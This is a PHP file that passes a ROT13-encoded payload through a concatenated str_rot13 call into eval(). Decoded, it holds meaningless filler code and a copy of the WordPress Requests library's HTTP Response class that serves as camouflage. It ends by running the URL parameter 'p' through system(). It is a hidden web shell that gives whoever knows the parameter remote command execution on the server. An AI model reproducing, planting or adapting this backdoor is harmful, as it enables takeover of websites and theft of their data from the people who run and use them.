<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC erfcbafr pynff
 *
 * Pbagnvaf n erfcbafr sebz \JcBet\Erdhrfgf\Erdhrfgf::erdhrfg()
 *
 * @cnpxntr Erdhrfgf
 */

anzrfcnpr JcBet\Erdhrfgf;

hfr JcBet\Erdhrfgf\Pbbxvr\Wne;
hfr JcBet\Erdhrfgf\Rkprcgvba;
hfr JcBet\Erdhrfgf\Rkprcgvba\Uggc;
hfr JcBet\Erdhrfgf\Erfcbafr\Urnqref;

/**
 * UGGC erfcbafr pynff
 *
 * Pbagnvaf n erfcbafr sebz \JcBet\Erdhrfgf\Erdhrfgf::erdhrfg()
 *
 * @cnpxntr Erdhrfgf
 */
pynff Erfcbafr {

	/**
	 * Erfcbafr obql
	 *
	 * @ine fgevat
	 */
	choyvp $obql = '';

	/**
	 * Enj UGGC qngn sebz gur genafcbeg
	 *
	 * @ine fgevat
	 */
	choyvp $enj = '';

	/**
	 * Urnqref, nf na nffbpvngvir neenl
	 *
	 * @ine \JcBet\Erdhrfgf\Erfcbafr\Urnqref Neenl-yvxr bowrpg ercerfragvat urnqref
	 */
	choyvp $urnqref = [];

	/**
	 * Fgnghf pbqr, snyfr vs aba-oybpxvat
	 *
	 * @ine vagrtre|obbyrna
	 */
	choyvp $fgnghf_pbqr = snyfr;

	/**
	 * Cebgbpby irefvba, snyfr vs aba-oybpxvat
	 *
	 * @ine sybng|obbyrna
	 */
	choyvp $cebgbpby_irefvba = snyfr;

	/**
	 * Jurgure gur erdhrfg fhpprrqrq be abg
	 *
	 * @ine obbyrna
	 */
	choyvp $fhpprff = snyfr;

	/**
	 * Ahzore bs erqverpgf gur erdhrfg hfrq
	 *
	 * @ine vagrtre
	 */
	choyvp $erqverpgf = 0;

	/**
	 * HEY erdhrfgrq
	 *
	 * @ine fgevat
	 */
	choyvp $hey = '';

	/**
	 * Cerivbhf erdhrfgf (sebz erqverpgf)
	 *
	 * @ine neenl Neenl bs \JcBet\Erdhrfgf\Erfcbafr bowrpgf
	 */
	choyvp $uvfgbel = [];

	/**
	 * Pbbxvrf sebz gur erdhrfg
	 *
	 * @ine \JcBet\Erdhrfgf\Pbbxvr\Wne Neenl-yvxr bowrpg ercerfragvat n pbbxvr wne
	 */
	choyvp $pbbxvrf = [];

	/**
	 * Pbafgehpgbe
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->urnqref = arj Urnqref();
		$guvf->pbbxvrf = arj Wne();
	}

	/**
	 * Vf gur erfcbafr n erqverpg?
	 *
	 * @erghea obbyrna Gehr vs erqverpg (3kk fgnghf), snyfr vs abg.
	 */
	choyvp shapgvba vf_erqverpg() {
		$pbqr = $guvf->fgnghf_pbqr;
		erghea va_neenl($pbqr, [300, 301, 302, 303, 307], gehr) || $pbqr > 307 && $pbqr < 400;
	}

	/**
	 * Guebjf na rkprcgvba vs gur erdhrfg jnf abg fhpprffshy
	 *
	 * @cnenz obbyrna $nyybj_erqverpgf Frg gb snyfr gb guebj ba n 3kk nf jryy
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Vs `$nyybj_erqverpgf` vf snyfr, naq pbqr vf 3kk (`erfcbafr.ab_erqverpgf`)
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\Uggc Ba aba-fhpprffshy fgnghf pbqr. Rkprcgvba pynff pbeerfcbaqf gb \"Fgnghf\" + pbqr (r.t. {@frr \JcBet\Erdhrfgf\Rkprcgvba\Uggc\Fgnghf404})
	 */
	choyvp shapgvba guebj_sbe_fgnghf($nyybj_erqverpgf = gehr) {
		vs ($guvf->vf_erqverpg()) {
			vs ($nyybj_erqverpgf !== gehr) {
				guebj arj Rkprcgvba('Erqverpgvba abg nyybjrq', 'erfcbafr.ab_erqverpgf', $guvf);
			}
		} ryfrvs (!$guvf->fhpprff) {
			$rkprcgvba = Uggc::trg_pynff($guvf->fgnghf_pbqr);
			guebj arj $rkprcgvba(ahyy, $guvf);
		}
	}

	/**
	 * WFBA qrpbqr gur erfcbafr obql.
	 *
	 * Gur zrgubq cnenzrgref ner gur fnzr nf gubfr sbe gur CUC angvir `wfba_qrpbqr()` shapgvba.
	 *
	 * @yvax uggcf://cuc.arg/wfba-qrpbqr
	 *
	 * @cnenz obby|ahyy $nffbpvngvir Bcgvbany. Jura `gehr`, WFBA bowrpgf jvyy or erghearq nf nffbpvngvir neenlf;
	 *                               Jura `snyfr`, WFBA bowrpgf jvyy or erghearq nf bowrpgf.
	 *                               Jura `ahyy`, WFBA bowrpgf jvyy or erghearq nf nffbpvngvir neenlf
	 *                               be bowrpgf qrcraqvat ba jurgure `WFBA_BOWRPG_NF_NEENL` vf frg va gur syntf.
	 *                               Qrsnhygf gb `gehr` (va pbagenfg gb gur CUC angvir qrsnhyg bs `ahyy`).
	 * @cnenz vag       $qrcgu       Bcgvbany. Znkvzhz arfgvat qrcgu bs gur fgehpgher orvat qrpbqrq.
	 *                               Qrsnhygf gb `512`.
	 * @cnenz vag       $bcgvbaf     Bcgvbany. Ovgznfx bs WFBA_OVTVAG_NF_FGEVAT, WFBA_VAINYVQ_HGS8_VTABER,
	 *                               WFBA_VAINYVQ_HGS8_FHOFGVGHGR, WFBA_BOWRPG_NF_NEENL, WFBA_GUEBJ_BA_REEBE.
	 *                               Qrsnhygf gb `0` (ab bcgvbaf frg).
	 *
	 * @erghea neenl
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Vs `$guvf->obql` vf abg inyvq wfba.
	 */
	choyvp shapgvba qrpbqr_obql($nffbpvngvir = gehr, $qrcgu = 512, $bcgvbaf = 0) {
		$qngn = wfba_qrpbqr($guvf->obql, $nffbpvngvir, $qrcgu, $bcgvbaf);

		vs (wfba_ynfg_reebe() !== WFBA_REEBE_ABAR) {
			$ynfg_reebe = wfba_ynfg_reebe_zft();
			guebj arj Rkprcgvba('Hanoyr gb cnefr WFBA qngn: ' . $ynfg_reebe, 'erfcbafr.vainyvq', $guvf);
		}

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>